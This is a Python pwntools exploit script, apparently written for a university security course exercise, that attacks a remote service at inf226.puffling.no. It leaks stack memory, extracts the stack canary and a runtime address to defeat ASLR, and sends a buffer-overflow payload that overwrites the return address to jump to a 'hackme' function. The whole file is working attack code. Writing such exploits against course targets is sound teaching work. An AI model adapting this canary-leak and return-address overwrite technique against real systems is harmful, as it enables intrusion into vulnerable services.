#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'   # change to 'info' to be quieter

HOST = 'inf226.puffling.no'
PORT = 6103

STATIC_MAIN_ADDR = 0x144f
STATIC_HACKME_ADDR = 0x1249
OFFSET = STATIC_MAIN_ADDR - STATIC_HACKME_ADDR # 0x206

io = remote(HOST, PORT)

# Get stack dump with b'-s'
io.send(b'-s\n')
data = io.recvrepeat(timeout=1)
text = data.decode(errors='ignore')
print("Raw leak:\n" + text)

# Parse hex from dump
lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
hex_lines = [ln for ln in lines if all(c in "0123456789abcdefABCDEF" for c in ln) and len(ln) >= 8]

if len(hex_lines) < 5:
    print("Couldn't find enough hex words in leak. Dump:\n" + text)
    io.close()
    exit(1)

main_leak = hex_lines[8]
print(f"main@runtime (string) = {main_leak}")
main_leak_int = int(main_leak, 16)
print(f"main@runtime = 0x{main_leak_int:016x}")

print(f"Potenital canary: {hex_lines[4]}")
canary_hex = hex_lines[4]
canary = int(canary_hex, 16)
print(f"Parsed canary: 0x{canary:016x}")

hackme_addr = main_leak_int - OFFSET
print(f"Computed hackme@runtime = 0x{hackme_addr:016x} (OFFSET = 0x{OFFSET:x})")

# Build payload
# layout (from buffer start): 8 bytes padding, 8 byte canary, 8 byte saved RBP, 8 byte return address
padding = b'A' * 8 
saved_rbp = b'B' * 8

hackme_addr = int(main_leak,16) - OFFSET
ret_addr = p64(hackme_addr)

payload = padding + p64(canary) + saved_rbp + ret_addr + b'\n'

print(f"Payload length: {len(payload)}")
print(f"Payload (hex): {payload.hex()}")

io.send(payload)

io.shutdown('out')
result = io.recvall(timeout=2)
print("Result:")
print(result.decode('ascii', errors='replace'))

io.close()
